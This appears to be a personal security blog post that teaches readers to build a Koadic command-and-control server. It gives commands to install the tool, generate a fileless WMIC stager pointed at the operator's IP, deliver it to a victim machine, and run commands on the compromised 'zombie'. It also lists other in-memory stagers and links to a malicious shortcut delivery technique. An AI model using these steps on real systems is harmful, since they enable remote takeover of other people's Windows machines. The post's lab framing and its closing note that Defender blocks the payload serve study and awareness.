---
title: "Create Command and Control Server with Koadic"
date: "2020-02-12"
layout: single
tags:
- Fileless
categories:
- Blog-post
---

Hey readers. Have you wonder how attacker compromised user and do the "bad things" from their Command and Control (C2) server to its zombies (victims) ?

In this tutorial, let us be that "attacker" and learn how they do this type of attack using a tool named [Koadic](https://github.com/zerosum0x0/koadic).

Disclaimer:
This is for research and education purpose only. Do with your own risk. Dosa guys pedajal orang.

Back to the topic. From their repo, they explained...

"Koadic, or COM Command & Control, is a Windows post-exploitation rootkit similar to other penetration testing tools such as Meterpreter and Powershell Empire. The major difference is that Koadic does most of its operations using Windows Script Host (a.k.a. JScript/VBScript), with compatibility in the core to support a default installation of Windows 2000 with no service packs (and potentially even versions of NT4) all the way through Windows 10.

It is possible to serve payloads completely in memory from stage 0 to beyond, as well as use cryptographically secure communications over SSL and TLS (depending on what the victim OS has enabled)."

## Installation

```
git clone https://github.com/zerosum0x0/koadic.git
cd koadic
pip3 install -r requirements.txt
./koadic
```
## Generate payload
First, we run koadic and use module named wmic.
```
use stager/js/wmic
set srvhost 192.168.83.128
run
```
Note:
Replace the IP with your own.

![enter image description here](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/cnc/1.png)
## Deliver payload

Copy the fileless `wmic` command and deliver to your target. In case here, I'm just copy and paste into my targeted virtual machine (Win7). This serves payloads in memory using WMIC. So, we can consider this as fileless malware cause it serves in memory. 

For example of delivering payload, you can do technique like [malicious .lnk](https://fareedfauzi.github.io/blog-post/Create-malicious-lnk/) to compromise user.

So, after press enter in cmd. The payload should be run.

![enter image description here](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/cnc/2.PNG)

Switch back to our kali machine, focus back to our terminal.

![enter image description here](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/cnc/3.PNG)

You will notice that our target machine now will become our first zombie.
If we issue command `zombies 0`, it will give information about the compromised user (our first zombie).

![enter image description here](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/cnc/4.PNG)

## Execute Command using Koadic

Using module `exec_cmd`, we specify the command that we want to execute. In this case, I give `calc.exe` as command that I want to execute.

![enter image description here](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/cnc/5.PNG)
```
use implant/manage/exec_cmd
set cmd calc.exe
set zombie 0
run
```
And calc.exe will be executed. Hooray 🎉.

![enter image description here](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/cnc/6.PNG)

We're now "king" for our zombies.

Let's try with other command line program.

```
set cmd ipconfig
set zombie 0
run
```

![enter image description here](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/cnc/7.PNG)

Let's demonstrate all the method in a .gif. Please zoom-in the gif if you can't see clearly.

![enter image description here](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/cnc/a.gif)

## Last but not least
For stagers, instead of using wmic as our fileless malware, this tool have other option like mshta and etc.

Module | Description | Malware Category
--------|------------|-----
stager/js/mshta | serves payloads in memory using MSHTA.exe HTML Applications | File-less
stager/js/regsvr | serves payloads in memory using regsvr32.exe COM+ scriptlets | File-less
stager/js/rundll32_js | serves payloads in memory using rundll32.exe | File- less
stager/js/disk | serves payloads using files on disk | File-based
stager/js/wmic | serves payloads in memory using WMIC | File-less
stager/js/bitsadmin | transfers a .wsf payload containing JScript over a Bitsadmin job and executes it | File-less

You can read more in [Koadic repository](https://github.com/zerosum0x0/koadic) readme[.]md .

# Last one again
I try this technique in Windows 10 with Defender protection turn on.

And defender blocked the file-less command line.

![enter image description here](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/cnc/8.PNG)

Users need to move on from Windows XP and 7 to Win10 as precautionary measures if users don't have plan to buy any Anti Virus products for their old Windows version. 👍

That's all. Thanks for reading!
